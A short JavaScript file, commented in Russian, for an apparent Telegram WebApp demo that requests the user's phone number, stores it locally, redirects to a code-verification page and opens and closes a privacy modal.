// Функция для кнопки входа
function showMessage() {
    alert('Кнопка пока не работает! Это просто демо-версия дизайна.');
}

function startVerification() {
    // Проверяем, запущено ли приложение в Telegram WebApp
    if (window.Telegram && window.Telegram.WebApp) {
        // Показываем кнопку для отправки номера телефона
        showPhoneRequest();
    } else {
        // Если не в Telegram, показываем обычный prompt
        const phone = prompt('Введите ваш номер телефона (например: +380123456789):');
        if (phone && phone.trim()) {
            localStorage.setItem('phoneNumber', phone.trim());
            window.location.href = 'code-verification.html';
        }
    }
}

function showPhoneRequest() {
    // Создаем кнопку для отправки номера телефона
    const button = window.Telegram.WebApp.MainButton;
    
    button.setText('📱 Поделиться номером телефона');
    button.show();
    
    // Обработчик нажатия на кнопку
    button.onClick(() => {
        // Запрашиваем контакт
        window.Telegram.WebApp.requestContact((contact) => {
            if (contact && contact.phone_number) {
                // Сохраняем номер
                localStorage.setItem('phoneNumber', contact.phone_number);
                
                // Переходим на страницу ввода кода
                window.location.href = 'code-verification.html';
            }
        });
    });
}

// Функции для модального окна
function showPrivacyModal() {
    document.getElementById('privacyModal').style.display = 'block';
    document.body.style.overflow = 'hidden'; // Блокируем скролл
}

function closePrivacyModal() {
    document.getElementById('privacyModal').style.display = 'none';
    document.body.style.overflow = 'auto'; // Возвращаем скролл
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('privacyModal');
    if (event.target === modal) {
        closePrivacyModal();
    }
}

// Закрытие модального окна по Escape
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closePrivacyModal();
    }
});
